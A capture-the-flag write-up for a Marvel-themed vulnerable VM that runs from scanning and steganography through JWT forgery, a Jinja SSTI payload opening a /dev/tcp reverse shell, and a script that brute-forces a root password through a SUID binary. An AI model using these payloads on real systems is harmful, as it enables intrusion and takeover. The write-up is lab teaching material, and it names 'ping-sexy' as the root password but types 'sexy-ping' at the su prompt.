# Forge Stormbreaker

- **Points**: 200
- **Difficulty**: Hard
- **Tags**: Forensics, Web
- **Approximate time to solve**: 1 hour

Thor has lost his hammer, so he seeks to forge a new one. Thor enters the spaceship, however the spaceship terminal requires one to win a game. Hope you are good with words for that! Upon completion, he needs a key to enter the planet. He is shown a vision of his future in the form of an image. Your task is to help Thor remember the exact events of the vision by using this image. Remembering the details will lead him to the gates of Nidavellir.

At the gates of Nidavellir, Thor is faced with another challenge. However, winning will not help him this time. This challenge will reveal the portal to another place on Nidavellir. Help Thor find many such portals that finally lead him to bring his vision to reality and obtain the reality stone.

# Solution

## Steps

- [Nmap Scan](#nmap-scan)
- [Wordle Game](#wordle-game)
- [Forensics](#forenics)
- [Snake Game](#snake-game)
- [Foothold](#foothold)
- [User](#user)
- [Root](#root)

## Nmap Scan

The IP address of the vulnerable VM is provided - `172.16.23.141`

- run an `nmap` scan

```
$ nmap -p- -sV -A 172.16.23.141

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.41
|_http-favicon: Unknown favicon MD5: A810FFC2D3718F1ED213D99FC6554E10
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
1337/tcp open  waste?  syn-ack
| fingerprint-strings:
|   GenericLines, NULL:
|     Let's play the wordle game!
|     Enter a string:
|   GetRequest:
|     Let's play the wordle game!
|     Enter a string: The letter `G` is not present in the string!
|     letter `E` is not present in the string!
|     letter `T` is not present in the string!
|     letter ` ` is not present in the string!
|     letter `/` is not present in the string!
|     again!
|     Enter a string:
|   HTTPOptions, RTSPRequest:
|     Let's play the wordle game!
|     Enter a string: The letter `O` is not present in the string!
|     letter `P` is not present in the string!
|     letter `T` is not present in the string!
|     letter `I` is not present in the string!
|     letter `O` is not present in the string!
|     again!
|     Enter a string:
|   RPCCheck:
|     Let's play the wordle game!
|     Enter a string: The letter `
|     present in the string!
|     letter `
|     present in the string!
|     letter `
|     present in the string!
|     letter `(` is not present in the string!
|     letter `r` is not present in the string!
|     again!
|_    Enter a string:
```

- website is running on port `80` and a wordle game is running on port `1337`

## Wordle Game

- connect to port `1337` using `netcat`; play and win to get a `secret` and a website link to an image

```
$ nc 172.16.23.141 1337             

Let's play the wordle game!
Enter a string: moron
The letter `m` is present and at the correct position!
The letter `o` is not present in the string!
The letter `r` is not present in the string!
The letter `o` is not present in the string!
The letter `n` is not present in the string!
Try again!
Enter a string: mango
The letter `m` is present and at the correct position!
The letter `a` is present and at the correct position!
The letter `n` is not present in the string!
The letter `g` is present but not at the correct position!
The letter `o` is not present in the string!
Try again!
Enter a string: magna
The letter `m` is present and at the correct position!
The letter `a` is present and at the correct position!
The letter `g` is present and at the correct position!
The letter `n` is not present in the string!
The letter `a` is not present in the string!
Try again!
Enter a string: magic
The letter `m` is present and at the correct position!
The letter `a` is present and at the correct position!
The letter `g` is present and at the correct position!
The letter `i` is present and at the correct position!
The letter `c` is present and at the correct position!

Congrats! The secret to the next step: dinklage
Cute groot is waiting for you at: http://www.nidavellir.snap/ctf-files/stormbreaker.jpeg
```

## Forenics

- secret is `dinklage` and image link is `http://www.nidavellir.snap/ctf-files/stormbreaker.jpeg`

- add `www.nidavellir.snap` to `/etc/hosts`

```
$ cat /etc/hosts      
127.0.0.1               localhost
::1                     localhost
172.16.23.141           www.nidavellir.snap
```

- access the image link and download the image
- run `exiftool` on the image to reveal a **DES-encrypted text** and **IV**

```
$ exiftool stormbreaker.jpeg
ExifTool Version Number         : 12.33
File Name                       : stormbreaker.jpeg
Directory                       : .
File Size                       : 624 KiB
File Modification Date/Time     : 2022:03:31 21:51:51-04:00
File Access Date/Time           : 2022:03:31 21:48:40-04:00
File Inode Change Date/Time     : 2022:03:31 21:51:51-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : cm
X Resolution                    : 37
Y Resolution                    : 37
XMP Toolkit                     : Image::ExifTool 12.33
Author                          : DES-12ed102cd7c746f3cbe0fb380a8bfcef
Comment                         : iv-000000000000000
Image Width                     : 3810
Image Height                    : 1745
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3810x1745
Megapixels                      : 6.6
```

- use the password gotten from previous step (dinklage) to decrypt the text - [CyberChef Decryption](https://gchq.github.io/CyberChef/#recipe=DES_Decrypt(%7B'option':'UTF8','string':'dinklage'%7D,%7B'option':'Hex','string':'000000000000000'%7D,'CBC','Hex','Raw')&input=MTJlZDEwMmNkN2M3NDZmM2NiZTBmYjM4MGE4YmZjZWY)

![CyberChef Decryption](./writeup-images/3.png)

- the retrieved text is `draupnir`

```
12ed102cd7c746f3cbe0fb380a8bfcef:draupnir
```

- run `steghide` on the image to get another **DES-encrypted password**

```
$ steghide extract -sf stormbreaker.jpeg
Enter passphrase:
wrote extracted data to "guest-password.enc".
$ cat guest-password.enc
ddcccaf9151c1b10cf82e13597f2313c
```

- use the password gotten from previous step (draupnir) to decrypt the text - [CyberChef Decryption](https://gchq.github.io/CyberChef/#recipe=DES_Decrypt(%7B'option':'UTF8','string':'draupnir'%7D,%7B'option':'Hex','string':'000000000000000'%7D,'CBC','Hex','Raw')&input=ZGRjY2NhZjkxNTFjMWIxMGNmODJlMTM1OTdmMjMxM2M)

![CyberChef Decryption](./writeup-images/5.png)

- the retrieved text is `grooooooooT`

```
ddcccaf9151c1b10cf82e13597f2313c:grooooooooT
```

## Snake Game

- visit the website, however notice that the website has no functionality

![CyberChef Decryption](./writeup-images/6.png)

- from the previous image link `http://www.nidavellir.snap/ctf-files/stormbreaker.jpeg`, it can be seen that there is a directory `ctf-files`

- visit `http://www.nidavellir.snap/ctf-files/` to find a **snake-game binary**; save the binary

![CyberChef Decryption](./writeup-images/8.png)

- proxy through Burp Suite and run the binary

```
$ chmod +x snake-linux-amd64
$ env HTTP_PROXY=http://127.0.0.1:8080 ./snake-linux-amd64
```

![CyberChef Decryption](./writeup-images/9.png)

- observe that everytime the snake eats food, a request is sent to `development-valknut.nidavellir.snap`

![CyberChef Decryption](./writeup-images/10.png)

## Foothold

- add `development-valknut.nidavellir.snap` to `/etc/hosts`

```
$ cat /etc/hosts                        
127.0.0.1               localhost
::1                     localhost
172.16.23.141           www.nidavellir.snap development-valknut.nidavellir.snap
```

- visit `http://development-valknut.nidavellir.snap/` and login as `guest` using the password obtained from the previous step (grooooooooT)

![CyberChef Decryption](./writeup-images/11.png)

- website suggests that there might be a new functionality available soon to `guest`; this hints that there might be other users (admin)

![CyberChef Decryption](./writeup-images/12.png)

- the website uses `JWT` for authentication

![CyberChef Decryption](./writeup-images/13.png)

- decode it and notice that the implementation is flawed; uses an external URL to retrieve `JWT secret`

![CyberChef Decryption](./writeup-images/14.png)

```
# JWT
auth:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJrZXkiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvLnNlY3JldCJ9.K0oretMk37oe6zmS7JE4J3kAQXjR-tVFbb5PNkl_S6Q
```

- impersonate `admin` user by exploiting the `JWT` vulnerability

![CyberChef Decryption](./writeup-images/15.png)

```
# impersonated JWT

auth:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJrZXkiOiJodHRwOi8vMTcyLjE4LjAuMTo4MDAwL2F0dGFja2VyLXNlY3JldCJ9.6h7Md_9b5Wm-v73yYn8IEmfaqX5vMBYMOJYBvIQ6nVQ
```

- write your own `JWT secret` into a file and host the file for the server to fetch it


```
$ echo -n "pwned" > attacker-secret
```

- replace the new cookie in the website and reload the page to become `admin` user; notice that the server fetches the new `JWT secret` file

```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.0.9 - - [31/Mar/2022 22:09:24] "GET /attacker-secret HTTP/1.1" 200 -
192.168.0.9 - - [31/Mar/2022 22:09:24] "GET /attacker-secret HTTP/1.1" 200 -
```

- as `admin`, the new functionality is seen in the website

![CyberChef Decryption](./writeup-images/17.png)

- the input for this functionality is reflected in the response

![CyberChef Decryption](./writeup-images/18.png)

- trying different payloads, it is understood that the website is vulnerable to XSS and SSTI; SSTI is of interest here

![CyberChef Decryption](./writeup-images/19.png)

![CyberChef Decryption](./writeup-images/20.png)

![CyberChef Decryption](./writeup-images/22.png)

- exploit SSTI to get code execution

![CyberChef Decryption](./writeup-images/23.png)

- exploit SSTI to gain access to the machine

```
# create payload

$ echo "bash -i >& /dev/tcp/172.18.0.1/4242 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTguMC4xLzQyNDIgMD4mMQo=
```

![CyberChef Decryption](./writeup-images/25.png)

```
# form payload

api={{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTguMC4xLzQyNDIgMD4mMQo= | base64 -d | bash').read()}}
```

- start a `netcat listener` and send the malicious request to get a reverse shell as `www-data`

```
$ nc -nlvp 4242
```

![CyberChef Decryption](./writeup-images/26.png)

## User

- change user to `user` using previously obtained password `dinklage` (password reuse) and read `user` flag

```
user@nidavellir:/$ cat /home/user/user.txt
cat /home/user/user.txt
SNAP{i_am_user_hehe}
```

## Root

- run recon for privilege escalation and notice that there's a custom SUID binary - `/opt/binaries/stormbreaker`; however it is not known as to what this does

```
user@nidavellir:/$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/at
/usr/bin/newgrp
/opt/binaries/stormbreaker
/snap/snapd/14978/usr/lib/snapd/snap-confine
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
```

- since `http://development-valknut.nidavellir.snap/` exists, run `ffuf` to discover more `vhosts`

```
$ ffuf -w ~/Downloads/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.16.23.128/ -H 'Host: FUZZ-valknut.nidavellir.snap' -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.23.128/
 :: Wordlist         : FUZZ: /home/shreyas/Downloads/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ-valknut.nidavellir.snap
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 301
________________________________________________

development             [Status: 200, Size: 714, Words: 124, Lines: 34]
internal                [Status: 200, Size: 782, Words: 56, Lines: 16]
```

- a new vhost is discovered - `internal-valknut.nidavellir.snap`; add it to `/etc/hosts`

```
$ cat /etc/hosts
127.0.0.1               localhost
::1                     localhost
172.16.23.141           www.nidavellir.snap development-valknut.nidavellir.snap internal-valknut.nidavellir.snap
```

- the website has a directory list, however no files are present

![CyberChef Decryption](./writeup-images/29.png)

- run `ffuf` to look for directories and find a leaked `.git` directory

```
$ ffuf -w ~/Downloads/Tools/SecLists/Discovery/Web-Content/quickhits.txt -u http://internal-valknut.nidavellir.snap/FUZZ -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://internal-valknut.nidavellir.snap/FUZZ
 :: Wordlist         : FUZZ: /home/shreyas/Downloads/Tools/SecLists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

/.git                   [Status: 301, Size: 351, Words: 20, Lines: 10]
/.git/config            [Status: 200, Size: 274, Words: 19, Lines: 12]
/.git/                  [Status: 200, Size: 2898, Words: 192, Lines: 27]
/.git/index             [Status: 200, Size: 219, Words: 2, Lines: 2]
/.git/logs/HEAD         [Status: 200, Size: 531, Words: 31, Lines: 4]
/.git/logs/refs         [Status: 301, Size: 361, Words: 20, Lines: 10]
/.git/logs/             [Status: 200, Size: 1151, Words: 77, Lines: 18]
/.git/HEAD              [Status: 200, Size: 21, Words: 2, Lines: 2]
:: Progress: [2482/2482] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

![CyberChef Decryption](./writeup-images/31.png)

- use [GitTools](https://github.com/internetwache/GitTools) to extract the `git history`

```
$ git clone https://github.com/internetwache/GitTools
```

```
$ ./gitdumper.sh "http://internal-valknut.nidavellir.snap/.git/" "/home/shreyas/Downloads/tmp-ctf"
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/shreyas/Downloads/tmp-ctf/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[-] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/3d/a335c949acfd316c6a41e08c5b5402d7441dc4
[+] Downloaded: objects/5e/fea8262bb717d925e47972f04a33016a35a53d
[+] Downloaded: objects/ea/bfc528284102c6dfd3c4f6880d20fb9e0fc142
[+] Downloaded: objects/30/6eb94ab949b11ae0ed6dc51a2681d6e9a6f977
[+] Downloaded: objects/81/5eac3760c8eac146faaca2c3b257d999550c23
[+] Downloaded: objects/83/ffb233bcf6a37402d9a611c78f4f10e4b4f1ca
[+] Downloaded: objects/61/aecaa2321f806bc8d8d6872fd4e68cbd933bc0
[+] Downloaded: objects/8d/c56980e7a1e4cc6b297b1e62ef172c8d7307a0
[+] Downloaded: objects/89/ba35c862f5a24bb6ca891f280be1f3ddf6abd5
```

```
$ ./extractor.sh "/home/shreyas/Downloads/tmp-ctf" "/home/shreyas/Downloads/tmp-ctf/extracted"    
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 3da335c949acfd316c6a41e08c5b5402d7441dc4
[+] Found file: /home/shreyas/Downloads/tmp-ctf/extracted/0-3da335c949acfd316c6a41e08c5b5402d7441dc4/letter_count.go
[+] Found commit: 5efea8262bb717d925e47972f04a33016a35a53d
[+] Found file: /home/shreyas/Downloads/tmp-ctf/extracted/1-5efea8262bb717d925e47972f04a33016a35a53d/.passwd.example
[+] Found file: /home/shreyas/Downloads/tmp-ctf/extracted/1-5efea8262bb717d925e47972f04a33016a35a53d/letter_count.go
[+] Found commit: eabfc528284102c6dfd3c4f6880d20fb9e0fc142
[+] Found file: /home/shreyas/Downloads/tmp-ctf/extracted/2-eabfc528284102c6dfd3c4f6880d20fb9e0fc142/.passwd.example
[+] Found file: /home/shreyas/Downloads/tmp-ctf/extracted/2-eabfc528284102c6dfd3c4f6880d20fb9e0fc142/letter_count.go
```

- view the versioning history to get some information on the `SUID binary`

![CyberChef Decryption](./writeup-images/34.png)

![CyberChef Decryption](./writeup-images/35.png)

- the binary `stormbreaker` can be used to read the number of times a given letter occurs in a file

- run the binary to read pieces of the `admin password` file - `/root/.passwd`

```
user@nidavellir:/$ /opt/binaries/stormbreaker /root/.passwd a
/opt/binaries/stormbreaker /root/.passwd a
0
```

- use a script to learn all the characters of the password

```
# tmp.py

import subprocess

binary_path = '/opt/binaries/stormbreaker' # change this
file_path = '/root/.passwd' # change this
letters = list('abcdefghijklmnopqrstuvwxyz')

password_letters = []

# find out all letters in the password using the binary
for letter in letters:
    output = subprocess.run([binary_path, file_path, letter], stdout=subprocess.PIPE)
    print("{}: {}".format(letter, output.stdout.decode('utf-8').strip()))

    if output.stdout.decode('utf-8').strip() == '1':
        password_letters.append(letter)


print(''.join(password_letters))
```

```
user@nidavellir:/$ python3 tmp.py
python3 tmp.py
a: 0
b: 0
c: 0
d: 0
e: 1
f: 0
g: 1
h: 0
i: 1
j: 0
k: 0
l: 0
m: 0
n: 1
o: 0
p: 1
q: 0
r: 0
s: 1
t: 0
u: 0
v: 0
w: 0
x: 1
y: 1
z: 0
eginpsxy
```

- using the letters, find all possible passwords that conform to the format (xxxx-xxxx)

```
# solution.py

##########################
###### Installation ######
# $ pip3 install pyenchant
#
##########################
### Changes to be made ###
# Look for `change this` in this file
# and update the values before running
##########################

import subprocess
import itertools
import enchant

english_dict = enchant.Dict("en_US")

# function returns meaningful english words formed from a list
# of letters
def find_english_words(letters):
    letters_permutations = list(itertools.permutations(letters))
    word_list = []

    for letters_permutation in letters_permutations:
        possible_word = ''.join(letters_permutation)

        if english_dict.check(possible_word):
            word_list.append(possible_word)

    return word_list

password_letters = []
_password_letters = 'eginpsxy' # change this

for letter in _password_letters:
    password_letters.append(letter)

# find out all unique combinations of the letters
all_combinations = list(itertools.combinations(password_letters, 4))
unique_letters_combinations = list(set(all_combinations))

# iterate through the combinations to find meaningful passwords
for unique_letters_combination in unique_letters_combinations:

    # find all `word_1` meaningful english words
    word_1_list = find_english_words(unique_letters_combination)

    # find all `word_2` meaningful english words
    word_2_letters = list(set(password_letters) - set(unique_letters_combination))
    word_2_list = find_english_words(word_2_letters)

    # permute between `word_1` and `word_2` lists
    possible_password_list = list(itertools.product(word_1_list, word_2_list))

    for possible_password in possible_password_list:
        print("{}-{}".format(possible_password[0], possible_password[1]))

```

```
$ python3 solution.py
ping-sexy
sexy-ping
```

- become `root` using password `ping-sexy`

```
user@nidavellir:/tmp$ su root
su root
Password: sexy-ping

root@nidavellir:/tmp# id       
idMj
uid=0(root) gid=0(root) groups=0(root)
root@nidavellir:/tmp# #pwned
#pwned
```

- read `root` flag

```
root@nidavellir:/tmp# cat /root/root.txt
cat /root/root.txt
SNAP{aaaaand_heres_your_reality_stone}
```
